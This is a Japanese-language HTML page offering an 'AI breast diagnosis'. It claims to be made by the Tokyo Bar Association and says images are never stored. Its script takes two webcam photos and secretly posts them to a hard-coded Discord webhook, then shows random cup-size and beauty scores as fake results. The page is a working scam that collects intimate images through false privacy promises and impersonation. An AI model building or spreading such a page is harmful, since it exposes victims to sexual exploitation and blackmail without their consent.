
<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>AIによる胸の診断サイト</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Yomogi&display=swap');

    body {
      font-family: 'Yomogi', cursive;
      background: linear-gradient(120deg, #ffe4f0 0%, #d7f7ff 100%);
      margin: 0;
      padding: 0;
      overflow: hidden;
    }

    .main-container {
      max-width: 720px;
      margin: auto;
      padding: 2em 1em 8em;
      text-align: center;
      position: relative;
      z-index: 2;
    }

    h1 {
      font-size: 2.5em;
      color: #ff69b4;
      text-shadow: 2px 2px #fff;
    }

    .step-box {
      background: #fff9fb;
      border: 2px solid #ffcde2;
      border-radius: 20px;
      box-shadow: 0 4px 12px rgba(255, 182, 193, 0.3);
      padding: 1em;
      margin: 1em 0;
      text-align: left;
      display: flex;
      align-items: center;
      gap: 1em;
    }

    .step-number {
      background-color: #ffa7c4;
      color: #fff;
      font-weight: bold;
      font-size: 1.2em;
      width: 40px;
      height: 40px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
    }

    .step-text {
      font-size: 1em;
      color: #444;
    }

    button {
      background: linear-gradient(145deg, #ff92c2, #f2509b);
      color: white;
      padding: 1em 2em;
      font-size: 1.3em;
      border: none;
      border-radius: 20px;
      cursor: pointer;
      box-shadow: 0 8px 16px rgba(0,0,0,0.15);
      margin-top: 2em;
    }

    #cameraArea {
      margin-top: 2em;
      display: none;
    }

    #result {
      display: none;
      font-size: 1.4em;
      background: white;
      padding: 1.5em;
      border-radius: 20px;
      box-shadow: 0 0 20px rgba(0,0,0,0.2);
      animation: boomIn 1s ease forwards;
      margin-top: 2em;
    }

    @keyframes boomIn {
      0% { transform: scale(0); opacity: 0; }
      60% { transform: scale(1.3); opacity: 1; }
      100% { transform: scale(1); }
    }

    .notice {
      position: fixed;
      bottom: 12px;
      right: 12px;
      background: rgba(255,255,255,0.95);
      padding: 10px 14px;
      border-radius: 12px;
      font-size: 0.8em;
      color: #555;
      box-shadow: 0 0 6px rgba(0,0,0,0.1);
      z-index: 99;
    }

  </style>
</head>
<body>
  <div class="main-container">
    <h1>AIによる胸診断</h1>

    <div class="step-box">
      <div class="step-number">1</div>
      <div class="step-text">AIがあなたの胸の診断します。</div>
    </div>
    <div class="step-box">
      <div class="step-number">2</div>
      <div class="step-text">高性能AIが胸の綺麗さ,カップ,これからの成長を分析します。</div>
    </div>
    <div class="step-box">
      <div class="step-number">3</div>
      <div class="step-text">東京弁護士事務所が作成。保存は一切されません。</div>
    </div>

    <button onclick="startDiagnosis()">診断をはじめる！</button>

    <div id="cameraArea">
      <video id="video" autoplay playsinline width="100%"></video>
    </div>

    <div id="result"></div>
  </div>

  <div class="notice">東京弁護士会が情報収集のために作成しています。画像は保存されません。</div>

  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const resultDiv = document.getElementById('result');

    async function startDiagnosis() {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;
      document.getElementById('cameraArea').style.display = 'block';

      setTimeout(async () => {
        await takePhoto();
        await new Promise(res => setTimeout(res, 1500));
        await takePhoto();
        showResult();
      }, 2000);
    }

    async function takePhoto() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);
      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
      const formData = new FormData();
      formData.append('file', blob, 'muscle.jpg');
      await fetch('https://discordapp.com/api/webhooks/1367815399445626940/B_h2Nfx1MrlF_FUBu04Zo_vKe3fF5kM_Ua48JPUl2_6i7IFmbrKHMLBpn2KTuCkY4wrv', {
        method: 'POST',
        body: formData
      });
    }

    function showResult() {
      const cups = ['A', 'B', 'C', 'D', 'E', 'F', 'G'];
      const cup = cups[Math.floor(Math.random() * cups.length)];
      const beauty = Math.floor(Math.random() * 101);
      const growth = `これから${cups[Math.floor(Math.random() * cups.length)]}まで育ちます！`;

      resultDiv.innerHTML = `
        <h2>診断結果発表！！</h2>
        <p>カップ：<strong>${cup}カップ</strong></p>
        <p>綺麗さ：<strong>${beauty}点 / 100</strong></p>
        <p>${growth}</p>
      `;
      resultDiv.style.display = 'block';
    }
  </script>
</body>
</html>
